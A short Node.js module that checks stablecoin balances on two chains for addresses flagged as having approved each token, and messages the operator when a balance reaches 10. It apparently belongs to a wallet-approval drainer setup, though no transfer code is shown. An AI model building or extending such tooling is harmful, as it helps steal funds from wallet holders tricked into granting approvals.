const busd = require('./contracts/busd')
const usdt = require('./contracts/usdt')
const e_usdt = require('./contracts/e_usdt')
const usdc = require('./contracts/usdc')
const e_usdc = require('./contracts/e_usdc')
const tusd = require('./contracts/tusd')
const e_tusd = require('./contracts/e_tusd')
const sender = require('./sender')


function checkBalance (addresses) {
    addresses.forEach(address => {

        if (address.busd_approved) {
            busd.getBalance(address.address).then(res => {
                balanceHandler('BUSD', address.address, res)
            })
        }

        if (address.usdt_approved) {
            usdt.getBalance(address.address).then(res => {
                balanceHandler('B_USDT', address.address, res)
            })
        }

        if (address.eth_usdt_approved) {
            e_usdt.getBalance(address.address).then(res => {
                balanceHandler('E_USDT', address.address, res)
            })
        }

        if (address.usdc_approved) {
            usdc.getBalance(address.address).then(res => {
                balanceHandler('B_USDC', address.address, res)
            })
        }

        if (address.eth_usdc_approved) {
            e_usdc.getBalance(address.address).then(res => {
                balanceHandler('E_USDC', address.address, res)
            })
        }

        if (address.tusd_approved) {
            tusd.getBalance(address.address).then(res => {
                balanceHandler('B_TUSD', address.address, res)
            })
        }

        if (address.eth_tusd_approved) {
            e_tusd.getBalance(address.address).then(res => {
                balanceHandler('E_TUSD', address.address, res)
            })
        }
    })
}

function balanceHandler (coin, address, balance) {
    const balanceValue = balance / 10 ** 18
    if (balanceValue >= 10) {
        sender.sendMessage(coin, balanceValue.toFixed(2), address)
    }
}

module.exports = {
    checkBalance
}
